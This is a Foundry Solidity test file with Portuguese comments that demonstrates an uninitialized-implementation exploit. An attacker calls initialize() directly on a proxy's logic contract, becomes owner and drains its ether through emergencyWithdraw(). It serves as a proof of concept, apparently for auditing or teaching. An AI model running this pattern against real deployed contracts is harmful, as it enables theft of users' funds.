// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/Logic.sol";
import "src/MyProxy.sol";

contract ExploitTest is Test {
    Logic public logic;
    MyProxy public proxy;

    address public user = makeAddr("USER");
    address public attacker = makeAddr("ATTACKER");

    uint256 public constant ATTACKER_STARTING_BALANCE = 1 ether;
    uint256 public constant LOGIC_CONTRACT_FUNDS = 5 ether;

    function setUp() public {
        // 1. Deploy do contrato de lógica
        logic = new Logic();

        // 2. Deploy do proxy, apontando para a lógica
        proxy = new MyProxy(address(logic));

        // 3. O usuário legítimo inicializa o *proxy* (como deve ser)
        vm.prank(user);
        Logic(payable(address(proxy))).initialize(user);

        // 4. VERIFICAÇÃO: O contrato de lógica em si NUNCA foi inicializado
        assertEq(logic.owner(), address(0));
        console.log(unicode"Verificacao do owner:", logic.owner());

        // 5. FINANCIAR O CONTRATO DE LÓGICA (para o roubo)
        vm.deal(address(logic), LOGIC_CONTRACT_FUNDS);
        assertEq(address(logic).balance, LOGIC_CONTRACT_FUNDS);

        // 6. Definir saldo inicial do invasor
        vm.deal(attacker, ATTACKER_STARTING_BALANCE);
        assertEq(attacker.balance, ATTACKER_STARTING_BALANCE);
    }

    function test_Exploit_StealEther() public {
        

        vm.startPrank(attacker);

        console.log(unicode"Atacante chamando initialize() no contrato de lógica...");
        logic.initialize(attacker);

        // Agora, o 'owner' do contrato de lógica é o invasor!
        assertEq(logic.owner(), attacker);
        console.log(unicode"Verificacao do owner apos ataque:", logic.owner());

        

        console.log(unicode"Invasor chamando emergencyWithdraw()...");
        logic.emergencyWithdraw();

        vm.stopPrank();

      
        assertEq(address(logic).balance, 0);

        // O saldo do invasor aumentou
        assertEq(attacker.balance, ATTACKER_STARTING_BALANCE + LOGIC_CONTRACT_FUNDS);

        console.log(unicode"Ataque bem-sucedido! Saldo do invasor:", attacker.balance);

        // O proxy em si não é afetado e continua funcionando
        vm.prank(user);
        Logic(payable(address(proxy))).setValue(999);
        assertEq(Logic(payable(address(proxy))).value(), 999);
    }
}